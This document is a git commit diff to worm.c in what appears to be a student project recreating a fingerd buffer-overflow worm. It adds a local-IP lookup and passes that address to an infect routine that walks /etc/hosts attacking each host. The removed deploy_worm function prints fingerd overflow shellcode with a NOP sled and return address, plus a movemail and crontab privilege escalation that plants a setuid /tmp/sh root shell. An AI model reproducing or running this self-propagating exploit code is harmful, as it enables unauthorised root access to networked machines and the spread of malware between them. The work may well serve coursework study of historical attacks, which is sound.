22871c0135066648772d105aaf409795661a6a43
nathanprkr <parkern2@carleton.edu>
2026-02-22 16:58:58 -0600

    Update worm.c

--- fingerd_bof/worm.c
+++ fingerd_bof/worm.c
@@ -2,11 +2,52 @@
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <signal.h>
+#include <netdb.h>
 
 #define HOSTS_FILE "/etc/hosts"
 #define MAX_IP_LEN 64
 #define RECEIVE_FILE_BSD_PATH "/receive_file_bsd.c"
 #define WORM_PATH "/worm.c"
+
+/*
+ * Get the current machine's IP address
+ * Stores result in ip buffer
+ * straight AI code, unsure if works. I dont understand it enough to know if it does
+ */
+void get_local_ip(char *ip) {
+	int sock;
+	struct sockaddr_in serv_addr, local_addr;
+	socklen_t len = sizeof(local_addr);
+
+	/* Create a UDP socket */
+	sock = socket(AF_INET, SOCK_DGRAM, 0);
+	if (sock < 0) {
+		strcpy(ip, "127.0.0.1");
+		return;
+	}
+
+	/* Connect to a public DNS (8.8.8.8:53) to determine local IP */
+	serv_addr.sin_family = AF_INET;
+	serv_addr.sin_port = htons(53);
+	inet_pton(AF_INET, "8.8.8.8", &serv_addr.sin_addr);
+
+	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+		strcpy(ip, "127.0.0.1");
+		close(sock);
+		return;
+	}
+
+	/* Get the local address bound to this socket */
+	if (getsockname(sock, (struct sockaddr *)&local_addr, &len) < 0) {
+		strcpy(ip, "127.0.0.1");
+		close(sock);
+		return;
+	}
+
+	/* Convert to string */
+	inet_ntop(AF_INET, &local_addr.sin_addr, ip, MAX_IP_LEN);
+	close(sock);
+}
 
 
 /**
@@ -99,191 +140,11 @@ void deploy_receive_file(int sock, char *my_ip) {
     free(formatted_source);
 }
 
-/**
- * Deploys worm.c and worm.h source code to the remote target.
- * sock - The active root shell.
- * REALLY SHOULD NOT NEED THIS, currently uncalled - just ignore, will delete later
- */
-void deploy_worm(int sock) {
-    char cmd_buf[IO_BUF_SIZE];
-    char temp_io[IO_BUF_SIZE];
-
-    // Define worm.h
-    const char *worm_h_contents = 
-    "#ifndef WORM_H_\n"
-    "#define WORM_H_\n\n"
-    "#include <stdio.h>\n"
-    "#include <stdlib.h>\n"
-    "#include <string.h>\n"
-    "#include <sys/socket.h>\n"
-    "#include <arpa/inet.h>\n"
-    "#include <unistd.h>\n\n"
-    "#define FINGERD_PORT 79\n\n"
-    "/* Buffer overflow related things */\n"
-    "#define BUF_SIZE 512 + 16 + 4\n"
-    "#define PAYLOAD \"\\\\335\\\\217/sh\\0\\\\335\\\\217/bin\\\\320^Z\\\\335\\0\\\\335\\0\\\\335Z\\\\335\\003\\\\320^\\\\\\\\274;\\\\344\\\\371\\\\344\\\\342\\\\241\\\\256\\\\343\\\\350\\\\357\\\\256\\\\362\\\\351\"\n"
-    "#define PAYLOAD_LEN 28\n"
-    "#define NOP 0x01\n\n"
-    "#define PATIENCE 3\n"
-    "#define IO_BUF_SIZE 2048\n\n"
-    "/* Movemail exploit commands */\n"
-    "#define MOVEMAIL_EXPLOIT \"(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\\n\"\n"
-    "#define CRONTAB_EXPLOIT \"(echo \\\"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\\\"; echo \\\"* * * * * root rm -f /usr/lib/crontab.local\\\") > /usr/lib/crontab.local\\n\"\n"
-    "#define CHECK_FOR_SHELL \"ls /tmp/sh\\n\"\n"
-    "#define RUN_SHELL \"/tmp/sh\\n\"\n"
-    "#define NOT_FOUND \"/tmp/sh not found\"\n\n"
-    "struct file_object {\n"
-    "    char *file_name;\n"
-    "    FILE *file_ptr;\n"
-    "    int file_size;\n"
-    "};\n\n"
-    "void create_sockaddr(struct sockaddr_in *serv_addr, char *ip, int port) {\n"
-    "    serv_addr->sin_family = AF_INET;\n"
-    "    serv_addr->sin_port = htons(port);\n"
-    "    inet_pton(AF_INET, ip, &serv_addr->sin_addr);\n"
-    "}\n\n"
-    "void create_exploit(char *buf, char *shellcode, ssize_t buf_size, size_t shellcode_len) {\n"
-    "    int i, j;\n"
-    "    int extra_words = 4 * 4;\n"
-    "    int address_size = 4;\n"
-    "    for (i = 0; i < buf_size; i++) buf[i] = NOP;\n"
-    "    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j];\n"
-    "    for (i = buf_size - extra_words - address_size; i < buf_size - address_size; i ++) { buf[i] = 0x00; }\n"
-    "    for (i = buf_size - address_size; i < buf_size; i += 4) {\n"
-    "        buf[i]   = 0x38; buf[i+1] = 0xea; buf[i+2] = 0xff; buf[i+3] = 0x7f;\n"
-    "    }\n"
-    "}\n\n"
-    "void read_from_sock(int sock, char *io_buf, size_t buf_size) {\n"
-    "    fd_set read_fds;\n"
-    "    int num_tries = 0;\n"
-    "    while (num_tries < PATIENCE) {\n"
-    "        FD_ZERO(&read_fds);\n"
-    "        FD_SET(sock, &read_fds);\n"
-    "        struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;\n"
-    "        int ready_fds = select(sock + 1, &read_fds, NULL, NULL, &tv);\n"
-    "        if (ready_fds > 0 && FD_ISSET(sock, &read_fds)) {\n"
-    "            int n = read(sock, io_buf, buf_size - 1);\n"
-    "            if (n > 0) { io_buf[n] = '\\0'; printf(\"%s\", io_buf); fflush(stdout); num_tries = 0; }\n"
-    "            else break;\n"
-    "        } else num_tries++;\n"
-    "    }\n"
-    "}\n\n"
-    "void write_to_sock(int sock, char *text) {\n"
-    "    fd_set write_fds;\n"
-    "    int num_tries = 0; size_t total_sent = 0; size_t len = strlen(text);\n"
-    "    while (num_tries < PATIENCE) {\n"
-    "        FD_ZERO(&write_fds); FD_SET(sock, &write_fds);\n"
-    "        struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;\n"
-    "        int ready_fds = select(sock + 1, NULL, &write_fds, NULL, &tv);\n"
-    "        if (ready_fds > 0 && FD_ISSET(sock, &write_fds)) {\n"
-    "            int n = write(sock, text + total_sent, len - total_sent);\n"
-    "            if (n > 0) { total_sent += n; num_tries = 0; }\n"
-    "            else break;\n"
-    "        } else num_tries++;\n"
-    "    }\n"
-    "}\n\n"
-    "void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size) {\n"
-    "    write_to_sock(sock, MOVEMAIL_EXPLOIT);\n"
-    "    write_to_sock(sock, CRONTAB_EXPLOIT);\n"
-    "    do {\n"
-    "        write_to_sock(sock, CHECK_FOR_SHELL);\n"
-    "        read_from_sock(sock, io_buf, buf_size);\n"
-    "        sleep(10);\n"
-    "    } while (!strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)));\n"
-    "    write_to_sock(sock, RUN_SHELL);\n"
-    "}\n\n"
-    "long int get_file_size(FILE *file_ptr) {\n"
-    "    if (file_ptr == NULL) return -1;\n"
-    "    fseek(file_ptr, 0L, SEEK_END);\n"
-    "    long int res = ftell(file_ptr);\n"
-    "    rewind(file_ptr);\n"
-    "    return res;\n"
-    "}\n\n"
-    "int send_int(int num, int fd) {\n"
-    "    int32_t conv = htonl(num);\n"
-    "    char *data = (char*)&conv; int left = sizeof(conv); int rc;\n"
-    "    do {\n"
-    "        rc = write(fd, data, left);\n"
-    "        if (rc < 0) return -1;\n"
-    "        else { data += rc; left -= rc; }\n"
-    "    } while (left > 0);\n"
-    "    return 0;\n"
-    "}\n\n"
-    "int receive_int(int *num, int fd) {\n"
-    "    int32_t ret;\n"
-    "    char *data = (char*)&ret; int left = sizeof(ret); int rc;\n"
-    "    do {\n"
-    "        rc = read(fd, data, left);\n"
-    "        if (rc <= 0) return -1;\n"
-    "        else { data += rc; left -= rc; }\n"
-    "    } while (left > 0);\n"
-    "    *num = ntohl(ret);\n"
-    "    return 0;\n"
-    "}\n\n"
-    "int load_files(char **file_paths, int num_files, struct file_object* files) {\n"
-    "    int i;\n"
-    "    for (i = 0; i < num_files; i++) {\n"
-    "        files[i].file_name = file_paths[i];\n"
-    "        files[i].file_ptr = fopen(file_paths[i], \"r\");\n"
-    "        if (files[i].file_ptr == NULL) return -1;\n"
-    "        files[i].file_size = get_file_size(files[i].file_ptr);\n"
-    "    }\n"
-    "    return 0;\n"
-    "}\n\n"
-    "int send_files(int client_sock, struct file_object *files, int num_files, char *file_buf, int buf_size) {\n"
-    "    int i, j, len, file_size, response;\n"
-    "    char *file_name;\n"
-    "    if (send_int(num_files, client_sock) < 0) return -1;\n"
-    "    if (receive_int(&response, client_sock) < 0) return -1;\n"
-    "    for (i = 0; i < num_files; i++) {\n"
-    "        file_name = files[i].file_name; len = strlen(file_name);\n"
-    "        if (send_int(len, client_sock)) return -1;\n"
-    "        send(client_sock, file_name, len, 0);\n"
-    "        file_size = files[i].file_size;\n"
-    "        if (send_int(file_size, client_sock) < 0) return -1;\n"
-    "        while (fgets(file_buf, buf_size, files[i].file_ptr) != NULL) {\n"
-    "            send(client_sock, file_buf, strlen(file_buf), 0);\n"
-    "        }\n"
-    "        rewind(files[i].file_ptr);\n"
-    "        if (receive_int(&j, client_sock) < 0) return -1;\n"
-    "    }\n"
-    "    return 0;\n"
-    "}\n"
-    "#endif\n";
-
-    // Define worm.c
-    const char *worm_c_contents = // put real worm.c contents here
-        "#include \"worm.h\"\n"
-        "#include <stdio.h>\n"
-        "int main() {\n"
-        "    printf(\"Worm executing...\\n\");\n"
-        "    return 0;\n"
-        "}\n";
-
-    // Send worm.h
-    printf("[*] Sending worm.h...\n");
-    write_to_sock(sock, "cat > /tmp/worm.h << 'EOF'\n");
-    write_to_sock(sock, (char *)worm_h_contents);
-    write_to_sock(sock, "\nEOF\n");
-    
-    sleep(2);
-    read_from_sock(sock, temp_io, IO_BUF_SIZE);
-
-    // Send worm.c
-    printf("[*] Sending worm.c...\n");
-    write_to_sock(sock, "cat > /tmp/worm.c << 'EOF'\n");
-    write_to_sock(sock, (char *)worm_c_contents);
-    write_to_sock(sock, "\nEOF\n");
-
-    sleep(2);
-    read_from_sock(sock, temp_io, IO_BUF_SIZE);
-}
-
 /*
  * Attempts to propagate the worm to a target host passed in via ip argument
  * Creates socket to fingerd, sends exploit, and executes propagation commands
  */
-void infect(char *ip) {
+void infect(char *ip, char *my_ip) {
 	int sock = 0;
 	struct sockaddr_in serv_addr;
 	char buf[BUF_SIZE] = {0};
@@ -362,8 +223,11 @@ int main() {
 	FILE *fp;
 	char line[128];
 	char ip[MAX_IP_LEN];
+	char my_ip[MAX_IP_LEN];
 
-	printf("[*] Worm Started\n");
+	/* Get the current machine's IP address */
+	get_local_ip(my_ip);
+	printf("[*] Worm Started on IP: %s\n", my_ip);
 	fflush(stdout);
 
 	/* Infinite loop for continuous propagation */
@@ -392,11 +256,11 @@ int main() {
 			/* Skip localhost and our own IP */
 			if (strcmp(ip, "127.0.0.1") == 0)
 				continue;
-			if (strcmp(ip, "10.0.2.15") == 0)
+			if (strcmp(ip, my_ip) == 0)
 				continue;
 
 			/* Infect the target */
-			infect(ip);
+			infect(ip, my_ip);
 
 			/* delay between infections, dont want to overwhelm network */
 			sleep(10);
